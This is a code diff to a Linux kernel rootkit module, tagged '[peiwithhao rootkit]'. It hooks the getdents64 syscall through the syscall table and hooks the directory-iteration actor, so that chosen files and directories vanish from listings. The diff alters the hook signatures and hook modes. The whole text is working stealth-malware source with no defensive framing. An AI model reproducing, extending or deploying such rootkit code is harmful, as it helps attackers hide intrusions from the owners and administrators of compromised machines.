@@ -20,11 +20,13 @@ struct file_hooked{
 
 
 
-static void getdents64_before_hooker(struct pt_regs *regs){
+static size_t getdents64_before_hooker(struct pt_regs *regs){
+    printk(KERN_INFO "ahellllloooooo");
+    return 0;
 }
 
 
-static void getdents64_after_hooker(struct pt_regs *regs, size_t *ret){
+static size_t getdents64_after_hooker(struct pt_regs *regs, size_t *ret){
     struct dir_hooked *pos, *tmp;
     unsigned long copy_nr;
     char dir_name[DIR_PATH_NR] = {0};
@@ -33,9 +35,10 @@ static void getdents64_after_hooker(struct pt_regs *regs, size_t *ret){
     list_for_each_entry_safe(pos, tmp, &system_dir_hooked_list, dir_hooked_list) {
         if(strstr(dir_name, pos->name)){
             *ret = 0;
-            return;
+            return 0;
         }
     }
+    return 0;
 }
 
 ssize_t dir_hidden_weak(char *dirname){
@@ -49,23 +52,25 @@ ssize_t dir_hidden_weak(char *dirname){
         printk(KERN_INFO "[peiwithhao rootkit] hook_ctx alloc failed...");
         return 1;
     }
-    hookpoint_add(getdents_hook_ctx, (size_t)((size_t *)syscall_table_addr)[217], (size_t)&getdents64_before_hooker, (size_t)&getdents64_after_hooker, HOOK_ETERNAL);
+    hookpoint_add(getdents_hook_ctx, (size_t)((size_t *)syscall_table_addr)[217], (size_t)&getdents64_before_hooker, (size_t)&getdents64_after_hooker, HOOK_COVER_ONCE);
     return 0;
 }
 char evil_file_name[FILE_PATH_NR] = ".";
 
-static void actor_before_hooker(struct pt_regs *regs){
+static size_t actor_before_hooker(struct pt_regs *regs){
     char *file_name = (char *)regs->si;
     struct dir_hooked *pos, *tmp;
     // printk(KERN_INFO "[peiwithhao rootkit] current filename: %s", file_name);
     list_for_each_entry_safe(pos, tmp, &system_file_hooked_list, dir_hooked_list) {
         if(strstr(file_name, pos->name)){
             // regs->dx = 0;
+            regs->cx = 0;
             regs->si = (size_t)evil_file_name;
             // printk(KERN_INFO "[peiwithhao rootkit] superise target: %s", (char *)regs->si);
-            return;
+            return 0;
         }
     }
+    return 0;
 }
 
 // static void actor_after_hooker(struct pt_regs *regs, size_t *ret){
@@ -81,10 +86,11 @@ static void actor_before_hooker(struct pt_regs *regs){
 // }
 
 
-static void iterate_dir_before_hooker(struct pt_regs *regs){
+static size_t iterate_dir_before_hooker(struct pt_regs *regs){
     struct dir_context *ctx = (struct dir_context *)regs->si;
     struct hook_context *actor_hook_ctx = hook_ctx_init();
     hookpoint_add(actor_hook_ctx, (size_t)ctx->actor, (size_t)&actor_before_hooker, (size_t)NULL, HOOK_ETERNAL);
+    return 0;
 }
 // 普通文件的hook
 /* 需要hook两点
